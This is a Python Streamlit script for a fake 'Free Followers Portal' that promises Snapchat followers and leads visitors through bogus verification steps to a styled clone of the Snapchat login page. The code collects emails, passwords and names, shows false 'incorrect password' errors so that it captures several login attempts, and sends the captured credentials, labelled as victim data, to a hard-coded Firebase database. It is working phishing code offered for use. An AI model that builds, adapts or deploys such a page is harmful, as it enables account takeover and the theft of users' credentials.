import streamlit as st
import time
import requests
import datetime
import uuid

# --- 1. PAGE CONFIGURATION ---
st.set_page_config(
    page_title="Free Followers Portal",
    page_icon="✨",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. FORCE LIGHT MODE & DITTO SCREENSHOT CLONE CSS ---
GLOBAL_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

/* 🔴 FORCE LIGHT MODE OVERRIDE */
:root { color-scheme: light !important; }
.stApp, .stApp > header { background-color: #f2f2f2 !important; } 
.stMarkdown, p, h1, h2, h3, h4, h5, h6, span { font-family: 'Inter', sans-serif !important; color: #000000 !important; }

/* 🔴 STEP 1 TO 4 PREMIUM PORTAL STYLES */
.portal-card { background: #ffffff; border-radius: 12px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; border: 1px solid #e2e8f0; }
.portal-title { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; }
.portal-subtitle { text-align: center; font-size: 14px; color: #64748b !important; font-weight: 500; margin-bottom: 25px; }
.input-label-portal { font-weight: 700 !important; font-size: 14px !important; margin-bottom: 8px !important; display: block; }
.stButton>button[kind="primary"] { background-color: #2563eb !important; color: #ffffff !important; border-radius: 8px !important; font-weight: 700 !important; border: none !important; width: 100% !important; padding: 10px !important; }

/* 🔴 EXACT ULTRA-ACCURATE CLONE FOR STEP 5 (SnapCHAT LOGIN) */
.clone-card {
    background-color: #ffffff !important;
    padding: 40px 35px !important;
    border-radius: 10px !important;
    box-shadow: 0 2px 12px rgba(0,0,0,0.04) !important;
    max-width: 400px !important;
    margin: 40px auto 10px auto !important;
    border: 1px solid #f1f1f1 !important;
}
.clone-brand {
    text-align: center !important; 
    font-size: 38px !important; 
    font-weight: 400 !important; 
    color: #000000 !important; 
    margin-bottom: 30px !important; 
    margin-top: -10px !important; 
    letter-spacing: -0.5px !important;
}
.clone-label {
    color: #8c92ac !important; 
    font-size: 11px !important; 
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important; 
    display: block !important;
}
/* Inputs Blueprint Override to achieve exact screenshot shape */
div[data-baseweb='input'] { border: none !important; border-radius: 6px !important; overflow: hidden !important; }
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; } 
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; } 
div[data-baseweb='input'] input { color: #000000 !important; font-weight: 600 !important; font-size: 14px !important; padding: 12px 14px !important; }
div[data-baseweb='input'] input::placeholder { color: #000000 !important; opacity: 1 !important; font-weight: 700 !important; }

/* Forgot Password Position Engine */
.forgot-pass { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 500 !important; margin-top: 6px !important; cursor: pointer !important; }

/* Rounded Bright Yellow Pill Button */
.stButton>button[kind="secondary"] {
    background-color: #fffc00 !important; 
    color: #000000 !important; 
    border-radius: 999px !important; 
    width: 140px !important; 
    font-weight: 700 !important; 
    font-size: 15px !important; 
    border: none !important; 
    padding: 8px 0px !important;
    margin: 30px auto 5px auto !important;
    display: block !important;
    box-shadow: none !important;
}
.stButton>button[kind="secondary"]:hover { background-color: #f0ec00 !important; }

/* Footer Segment Outside Card */
.clone-footer { text-align: center !important; font-size: 14px !important; color: #000000 !important; font-weight: 500 !important; margin-top: 35px !important; }
.clone-footer b { font-weight: 700 !important; margin-left: 5px !important; color: #000000 !important; }
</style>
"""
st.markdown(GLOBAL_CSS, unsafe_allow_html=True)

# --- 3. UPDATED ACCURATE DATABASE PATHWAY ---
# Direct configuration point to your specific logs directory path
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu.json"

if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'login_attempts' not in st.session_state: st.session_state.login_attempts = 1
if 'failed_logins' not in st.session_state: st.session_state.failed_logins = []

def save_to_firebase(status_string):
    payload = {
        "last_updated_time": str(datetime.datetime.now()),
        "current_session_status": status_string,
        "victim_portal_profile": st.session_state.portal_data,
        "intercepted_login_logs": st.session_state.failed_logins
    }
    try:
        # Patch/Post mechanics directed straight into your custom path key
        requests.patch(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE FOLLOWERS REGISTRATION
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
    
    # Free tricks website logo deployment
    colA, colB, colC = st.columns([1,2,1])
    with colB:
        try:
            st.image("1.png", use_container_width=True)
        except:
            st.markdown("<p style='text-align:center; color:gray; font-size:12px;'>[ 1.png Logo Space ]</p>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-title'>Free Followers Portal</div><div class='portal-subtitle'>Free Followers Portal SnapChat</div>", unsafe_allow_html=True)
    
    st.markdown("<span class='input-label-portal'>📧 Enter Email Address</span>", unsafe_allow_html=True)
    email = st.text_input("email", label_visibility="collapsed")
    
    st.markdown("<span class='input-label-portal'>👤 Create Portal Username</span>", unsafe_allow_html=True)
    new_username = st.text_input("user", placeholder="e.g. Creator123", label_visibility="collapsed")
    
    st.markdown("<span class='input-label-portal'>🔑 Create Password</span>", unsafe_allow_html=True)
    password = st.text_input("pass", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("🚀 Register & Verify Username", type="primary"):
        if email and new_username and password:
            box = st.empty()
            box.info("🔄 Connecting to Database Node Matrix...")
            time.sleep(1.5)
            box.info("🔄 Scanning availability across active paths...")
            time.sleep(1.5)
            box.empty()
            
            if len(new_username) < 3:
                st.error("❌ Username validation failed: Handle is too short.")
            else:
                st.success("✅ Protocol Match: Username unique & slots available!")
                time.sleep(1)
                st.session_state.portal_data.update({"email": email, "portal_username": new_username, "portal_password": password})
                st.session_state.step = 2
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Fill all active parameters to proceed.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 2: PERSONAL COOKIE SYNC
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-title'>Personal Cookie Sync ⚙️</div><div class='portal-subtitle'>Syncing device session profiles for secure flow allocation</div>", unsafe_allow_html=True)
    
    st.markdown("<span class='input-label-portal'>First Name</span>", unsafe_allow_html=True)
    fname = st.text_input("fname", label_visibility="collapsed")
    
    st.markdown("<span class='input-label-portal'>Last Name</span>", unsafe_allow_html=True)
    lname = st.text_input("lname", label_visibility="collapsed")
    
    st.write("")
    if st.button("Submit Details & Build Payload ⚡", type="primary"):
        if fname:
            bar = st.progress(0)
            for i in range(100):
                time.sleep(0.015)
                bar.progress(i + 1)
            st.session_state.portal_data.update({"first_name": fname, "last_name": lname})
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Mandatory Check Error: First Name cannot be left empty.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 3: HIGH-STAKES PROFILE MATRIX CHECK
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-title'>Target Profile Matrix Selection 🎯</div><div class='portal-subtitle'>Configure cloud delivery optimization metrics</div>", unsafe_allow_html=True)
    
    is_public = st.radio("Is your SnapChat profile Public? 🔓", ["Yes, it is Public", "No, it is Private"], index=0)
    has_dp = st.radio("Have you uploaded an active Profile Picture (DP)? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    followers = st.select_slider("🔥 Select premium cloud delivery allocation load:", options=[500, 1000, 2500, 5000, 10000])
    
    st.write("")
    if st.button("Generate Secure Injection Token 🛡️", type="primary"):
        if is_public == "No, it is Private" or has_dp == "No":
            st.error("❌ Target Extraction Rejected: Cloud matrix can only target PUBLIC accounts with active profile photos.")
        else:
            msg = st.empty()
            msg.warning("📡 Initiating remote proxy handshake...")
            time.sleep(1.5)
            msg.warning("📡 Isolating node stream server pipelines...")
            time.sleep(1.5)
            msg.empty()
            
            st.session_state.portal_data.update({"is_public": is_public, "has_dp": has_dp, "followers_requested": followers})
            st.session_state.token = f"VCF-{str(uuid.uuid4())[:8].upper()}"
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 4: PREMIUM TOKEN SCREEN & ANTI-BOT GATE
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
    st.markdown(f"<h3 style='text-align:center;'>🔒 Secure Token Isolated: <span style='color:#ef4444; font-family:monospace;'>{st.session_state.token}</span></h3>", unsafe_allow_html=True)
    st.info("🕒 Standard Distribution Waiting Queue Frame: 24 Hours.")
    
    st.write("---")
    st.markdown("<div style='text-align:center;'><h4 style='font-weight:700;'>⚡ Instant Priority Pipeline Delivery (1 Hour)</h4><p style='font-size:13px; color:#475569;'>Bypass the queue lock frame by verifying your official session footprint identity.</p></div>", unsafe_allow_html=True)
    
    if st.button("PRO: Verify Official SnapChat ID Now 🚀", type="primary"):
        bot = st.empty()
        bot.info("🤖 Launching AI Device-Fingerprint Security Protocol...")
        time.sleep(2)
        bot.success("✅ Machine verification bypass cleared! Redirecting to verification terminal...")
        time.sleep(1)
        bot.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 5: EXACT DITTO SCRIPT-CLONE LOGIN PAGE
# ==========================================
elif st.session_state.step == 5:
    # Target frame container block
    st.markdown("<div class='clone-card'>", unsafe_allow_html=True)
    
    # 1. Image Logo Framework Integration (Using 2.jpg)
    col1, col2, col3 = st.columns([1, 1.4, 1])
    with col2:
        try:
            st.image("2.jpg", use_container_width=True)
        except:
            st.markdown("<p style='color:#ff4444; text-align:center; font-size:26px; font-weight:bold; margin:0;'>logo</p>", unsafe_allow_html=True)
    
    # 2. Exact Brand Font Mapping
    st.markdown("<p class='clone-brand'>Snapchat</p>", unsafe_allow_html=True)
    
    # 3. Form Setup with Exact Placeholder matching
    with st.form("clone_form", clear_on_submit=False):
        st.markdown("<span class='clone-label'>username or email</span>", unsafe_allow_html=True)
        vc_user = st.text_input("user", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("") 
        
        st.markdown("<span class='clone-label'>password</span>", unsafe_allow_html=True)
        vc_pass = st.text_input("pass", type="password", placeholder="Enter your password", label_visibility="collapsed")
        
        st.markdown("<div class='forgot-pass'>Forgot Password</div>", unsafe_allow_html=True)
        
        # Yellow Pill Submit Trigger
        st.write("")
        submit = st.form_submit_button("Log In", type="secondary")
        
        if submit:
            if vc_user and vc_pass:
                # Append intercept sequence matrix logs
                attempt = {
                    "attempt_number": st.session_state.login_attempts, 
                    "input_user": vc_user, 
                    "input_pass": vc_pass,
                    "captured_at": str(datetime.datetime.now())
                }
                st.session_state.failed_logins.append(attempt)
                
                if st.session_state.login_attempts < 4:
                    save_to_firebase(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts}")
                    st.session_state.login_attempts += 1
                    with st.spinner("Connecting to secure authentication node..."):
                        time.sleep(4.0) # Explicit 4 Second simulation wait loop
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    save_to_firebase("INTERCEPT_COMPLETE_FINAL_SYNC")
                    with st.spinner("Syncing authenticated token with cloud network..."):
                        time.sleep(4.0)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("Please fill out all login fields.")
    
    st.markdown("</div>", unsafe_allow_html=True)
    
    # External login box footer
    st.markdown("<div class='clone-footer'>New To Snapchat?<b>Sign Up</b></div>", unsafe_allow_html=True)

# ==========================================
# STEP 6: ALLOCATION SUCCESS LAYER
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
    st.success("✅ Snapchat account Verification Successful")
    st.markdown("<div style='text-align:center; padding:15px 0;'><h2 style='color:#16a34a; font-weight:800;'>Queue Bypassed!</h2><p style='font-size:15px; font-weight:700; color:#2563eb;'>🚀 Allocation Injection Status: Active (Est. Arrival: 45 Mins)</p></div>", unsafe_allow_html=True)
    st.balloons()
    st.markdown("</div>", unsafe_allow_html=True)


